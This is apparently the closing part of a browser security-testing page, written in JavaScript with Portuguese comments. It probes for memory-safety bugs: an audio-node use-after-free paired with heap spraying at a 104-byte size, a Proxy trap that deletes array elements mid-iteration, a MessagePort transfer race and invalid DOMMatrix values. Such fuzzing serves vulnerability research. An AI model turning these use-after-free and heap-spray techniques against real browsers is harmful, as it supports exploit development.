    // Target: 104 bytes (FPuVH - Menor variante)
    // Tenta destruir um AudioWorkletNode no momento exato de sua instanciação
    // na thread de áudio. (Simulado com ScriptProcessor se Worklet indisponível).
    function runTest97() {
        log("Iniciando Test 97: Audio Node UAF (104b)...");
        try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            var node = ctx.createScriptProcessor(4096, 1, 1);
            
            node.onaudioprocess = function(e) {
                // Suicídio durante callback
                node.disconnect();
                node = null;
                ctx.close(); // Mata contexto
                spray(104);
            };
            
            node.connect(ctx.destination);
            log("Audio process started.", "ok");
        } catch(e) { log("Audio Error: " + e); }
    }

    // --- TEST 98: Array.reduceRight Proxy Trap (Silent) ---
    // reduceRight itera do fim para o início.
    // Usamos Proxy para deletar elementos à frente do cursor.
    function runTest98() {
        log("Iniciando Test 98: ReduceRight Proxy...");
        var arr = [0, 1, 2, 3];
        var p = new Proxy(arr, {
            get: function(t, k) {
                if (k === '3') {
                    log("Index 3 accessed. Deleting index 2...");
                    delete t[2]; // Torna o próximo alvo 'empty'
                    spray(32);
                }
                return t[k];
            }
        });

        try {
            p.reduceRight(function(acc, val, idx) {
                if (idx === 2 && val === undefined) {
                    log("ALERTA: reduceRight leu slot deletado/indefinido!", "alert");
                }
                return acc + val;
            }, 0);
            log("Reduce operation finished.", "ok");
        } catch(e) { log(e); }
    }

    // --- TEST 99: MessagePort Transfer Queue Race (Race) ---
    // Envia múltiplas mensagens e transfere a porta no meio do lote.
    // O kernel deve garantir que mensagens prévias cheguem antes da transferência.
    function runTest99() {
        log("Iniciando Test 99: Port Queue Race...");
        var mc = new MessageChannel();
        var p1 = mc.port1;
        var p2 = mc.port2;
        
        var received = 0;
        p2.onmessage = function(e) {
            received++;
            if (e.data === "last") {
                if (received < 3) log("ALERTA: Mensagens perdidas na race!", "alert");
                else log("Sequência preservada (Safe).", "ok");
            }
        };

        // Envia msg, msg, e transfere a porta com a última msg
        p1.postMessage("1");
        p1.postMessage("2");
        
        // Race: A porta p1 é transferida para "ela mesma" (loopback fictício via window)
        // ou apenas enviada. A questão é: as msgs "1" e "2" garantem entrega?
        try {
            window.postMessage("last", "*", [p1]);
        } catch(e) { log("Transfer post failed: " + e); }
    }

    // --- TEST 100: Geometry DOMMatrix Infinite Cycle (State) ---
    // Manipula objetos de geometria (DOMMatrix) para criar dependências cíclicas
    // ou valores inválidos (NaN/Infinity) que quebram cálculos de layout subsequentes.
    function runTest100() {
        log("Iniciando Test 100: DOMMatrix State...");
        if (!window.DOMMatrix) return log("DOMMatrix off");
        
        try {
            var m = new DOMMatrix();
            m.a = Infinity; 
            m.d = NaN;
            
            // Tenta inverter matriz inválida
            var inv = m.inverse();
            
            // Tenta aplicar em um ponto
            var p = new DOMPoint(10, 10);
            var res = p.matrixTransform(inv);
            
            if (isNaN(res.x) || !isFinite(res.x)) {
                log("Matriz inválida tratada (NaN/Inf propagado).", "ok");
            } else {
                log("ALERTA: Cálculo com matriz corrompida retornou valor finito?", "alert");
            }
        } catch(e) {
            // InvalidStateError é bom
            log("Erro de estado (Safe): " + e.name, "ok");
        }
    }


</script>
</body>
</html>
